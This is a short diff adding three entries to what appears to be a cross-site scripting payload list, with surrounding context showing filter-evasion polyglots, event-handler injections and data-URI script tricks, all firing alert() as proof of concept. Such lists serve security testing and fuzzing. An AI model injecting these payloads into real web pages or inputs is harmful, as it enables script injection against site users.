@@ -1209,3 +1209,6 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 <a href="data:　, &lt &NewLine; script &gt alert(1) &lt /script &gt ">CLICK
 <div style=overflow:-webkit-marquee onscroll=alert(1)>
 <b onbeforescriptexecute=alert(1)>
+alert(1 ===  1)
+<a href="#" ping="file://%00/%00/x">Boom</a><script>document.querySelector('a').click();</script>
+<script>alert//.%0D(1)</script>
